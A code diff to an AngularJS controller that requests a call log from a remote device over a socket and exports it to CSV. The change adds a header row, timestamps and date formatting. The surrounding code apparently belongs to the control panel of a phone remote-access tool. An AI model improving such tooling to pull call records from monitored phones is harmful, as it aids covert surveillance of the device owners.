@@ -361,7 +361,7 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
 
 
 //-----------------------Calls Controller (callslogs.htm)------------------------
-// Calls controller
+// Calls controller - UPDATED WITH TIMESTAMP SUPPORT
 app.controller("CallsCtrl", function ($scope, $rootScope) {
     $CallsCtrl = $scope;
     $CallsCtrl.callsList = [];
@@ -376,22 +376,25 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
     $rootScope.Log('Get Calls list..');
     socket.emit(ORDER, { order: calls });
 
-
     $CallsCtrl.barLimit = 50;
     $CallsCtrl.increaseLimit = () => {
         $CallsCtrl.barLimit += 50;
     }
-
 
     $CallsCtrl.SaveCalls = () => {
         if ($CallsCtrl.callsList.length == 0)
             return;
 
         var csvRows = [];
+        // Header for CSV
+        csvRows.push("Phone Number,Name,Duration,Type,Date"); 
+
         for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
             var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
             var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
-            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
+            // Include the formatted date in the CSV row
+            var callDate = $CallsCtrl.callsList[i].date || "N/A";
+            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type + "," + callDate);
         }
 
         var csvStr = csvRows.join("\n");
@@ -402,25 +405,30 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
                 $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
             else
                 $rootScope.Log("Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
-
         });
-
     }
 
     socket.on(calls, (data) => {
         if (data.callsList) {
             $CallsCtrl.load = '';
             $rootScope.Log('Calls list arrived', CONSTANTS.logStatus.SUCCESS);
+            
+            // Format timestamps for the browser display
+            data.callsList.forEach(function(call) {
+                if (call.date) {
+                    // Converts raw ms to local date string (e.g. 2/6/2026, 11:45 AM)
+                    call.date = new Date(parseInt(call.date)).toLocaleString();
+                } else {
+                    call.date = "Unknown Time";
+                }
+            });
+
             $CallsCtrl.callsList = data.callsList;
             $CallsCtrl.logsSize = data.callsList.length;
             $CallsCtrl.$apply();
         }
     });
-
-
-
 });
-
 
 
 
